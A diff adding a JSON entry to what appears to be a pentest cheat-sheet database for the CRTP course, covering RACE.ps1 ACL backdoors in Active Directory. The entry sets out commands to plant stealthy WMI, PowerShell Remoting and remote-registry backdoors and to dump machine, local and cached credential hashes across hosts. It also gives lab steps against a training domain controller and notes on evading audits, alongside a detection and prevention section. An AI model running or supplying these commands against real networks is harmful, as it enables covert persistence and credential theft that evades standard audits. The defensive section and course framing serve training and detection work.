@@ -1,0 +1,135 @@
+{
+  "id": "crtp-race-backdoors",
+  "name": "ACL Backdoors with RACE.ps1 (WMI / PSRemoting / Registry)",
+  "command": "Set-RemoteWMI -SamAccountName <user> -ComputerName <host> -namespace 'root\\cimv2' -Verbose",
+  "description": "RACE (Remote ACL Configuration Enabler) drops stealthy DACL-based backdoors so a chosen low-priv user keeps remote access without new accounts or credentials. It edits security descriptors for WMI, PowerShell Remoting, and remote registry, and can pull a machine-account hash - persistence that survives password resets.",
+  "platform": "windows",
+  "category": "Active Directory",
+  "subcategory": "Persistence",
+  "type": "command",
+  "certifications": [
+    "CRTP"
+  ],
+  "source": "CRTP",
+  "opsec": "moderate",
+  "mitre": [
+    "T1098",
+    "T1546",
+    "T1112"
+  ],
+  "tools": [
+    "RACE.ps1"
+  ],
+  "tags": [
+    "acl-backdoor",
+    "persistence",
+    "wmi",
+    "psremoting",
+    "remote-registry",
+    "race",
+    "crtp"
+  ],
+  "variations": [
+    {
+      "label": "PowerShell Remoting backdoor",
+      "command": "Set-RemotePSRemoting -SamAccountName <user> -ComputerName <host> -Verbose"
+    },
+    {
+      "label": "Remote registry backdoor (read machine secrets)",
+      "command": "Add-RemoteRegBackdoor -ComputerName <host> -Trustee <user> -Verbose"
+    },
+    {
+      "label": "Retrieve the machine account hash remotely",
+      "command": "Get-RemoteMachineAccountHash -ComputerName <host> -Verbose"
+    },
+    {
+      "label": "Set-ADACL - grant rights on an AD object (RACE)",
+      "command": "Set-ADACL -SamAccountName <user> -DistinguishedName <object_dn> -Right <right> -Verbose"
+    },
+    {
+      "label": "Retrieve local account hashes remotely",
+      "command": "Get-RemoteLocalAccountHash -ComputerName <host> -Verbose"
+    },
+    {
+      "label": "Retrieve domain cached credentials",
+      "command": "Get-RemoteCachedCredential -ComputerName <host> -Verbose"
+    },
+    {
+      "label": "Dump hashes across many hosts (Get-PassHashes)",
+      "command": "Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <hostlist>)"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Import RACE",
+      "command": ". C:\\AD\\Tools\\RACE.ps1"
+    },
+    {
+      "label": "Grant studentx remote WMI on the DC",
+      "command": "Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc -namespace 'root\\cimv2' -Verbose"
+    },
+    {
+      "label": "Verify by querying WMI as that user",
+      "command": "gwmi -class win32_operatingsystem -ComputerName dcorp-dc"
+    },
+    {
+      "label": "Add remote-registry backdoor + pull machine hash",
+      "command": "Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose; Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose"
+    }
+  ],
+  "examples": [
+    {
+      "label": "PSRemoting backdoor then remote command",
+      "command": "Set-RemotePSRemoting -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose\nInvoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local"
+    }
+  ],
+  "notes": "RACE modifies security descriptors (not group membership), so the backdoor is invisible to 'who is a Domain Admin' checks and needs local admin only at setup time. The remote-registry backdoor exposes SAM/LSA secrets and lets Get-RemoteMachineAccountHash retrieve the computer's NTLM hash - which then enables silver tickets (crtp-silver-ticket). Requires admin on the target when applying. Complements crtp-acl-persistence (AD DACL / DCSync) and crtp-adminsdholder.",
+  "references": [
+    {
+      "title": "CRTP - Attacking and Defending AD (lab)",
+      "url": "https://www.alteredsecurity.com/adlab"
+    },
+    {
+      "title": "RACE.ps1 (GitHub)",
+      "url": "https://github.com/samratashok/RACE"
+    },
+    {
+      "title": "MITRE ATT&CK T1098 - Account Manipulation",
+      "url": "https://attack.mitre.org/techniques/T1098/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "crtp-credential-dumping",
+      "note": "Local admin on the target (needed to apply RACE) usually comes from a cred dump",
+      "rel": "prereq"
+    },
+    {
+      "id": "crtp-silver-ticket",
+      "note": "Use the retrieved machine hash to forge silver tickets",
+      "rel": "next"
+    },
+    {
+      "id": "crtp-acl-persistence",
+      "note": "AD-object DACL backdoor (DCSync) is the domain-level counterpart",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "prerequisites": "Local admin on the target host (to modify WMI/WinRM/registry security descriptors). A principal to grant access to (existing low-priv user - no new account needed).",
+    "why_it_works": "WMI namespaces, the WinRM/PowerShell endpoint, and remote registry each have their own DACL. Granting a user access there provides durable remote entry without touching AD group membership, so standard privileged-group audits miss it; the security-descriptor change persists across password changes.",
+    "misconfiguration": "No baselining of WMI/WinRM/registry DACLs; local admin widely available; no alerting on security-descriptor modifications; remote registry enabled.",
+    "impact": "Stealthy, resilient remote access and remote code execution as a low-priv user, plus machine-hash retrieval enabling silver tickets - persistence that survives credential resets and evades group-based detection.",
+    "detection": "Modifications to WMI namespace security (Set-WmiNamespaceSecurity patterns), WinRM RootSDDL changes, and registry key DACL edits (Event 4670 - permissions changed); RACE function names in Script Block Logging (4104); unexpected remote WMI/WinRM/registry access by a non-admin user afterward.",
+    "artifacts": "Altered DACLs on root\\cimv2, WSMan RootSDDL, and HKLM keys; 4670 permission-change events; later 4624 type-3 logons + WMI/WinRM access from the backdoored user.",
+    "vulnerable_config": "# Default WMI/WinRM/registry DACLs unmonitored\n# Remote Registry enabled; local admin broadly held\n# No SACL auditing on these objects",
+    "secure_config": "# Baseline + monitor WMI namespace, WinRM RootSDDL, and registry DACLs\n# Enable object-access auditing (4670) on these securable objects\n# Disable Remote Registry; restrict local admin (LAPS + tiering)\n# Alert on RACE cmdlet names in Script Block Logging",
+    "prevention": "Baseline and alert on WMI/WinRM/registry DACL changes; enable permission-change auditing; restrict local admin (LAPS, tiering); disable Remote Registry. [MITRE M1047, M1026, M1028]",
+    "evasion": "No new account or group change (evades DA-membership audits); reuses an existing user; security-descriptor edits are low-signal without explicit DACL monitoring.",
+    "sources": [
+      "CRTP",
+      "MITRE T1098",
+      "MITRE T1546"
+    ]
+  }
+}
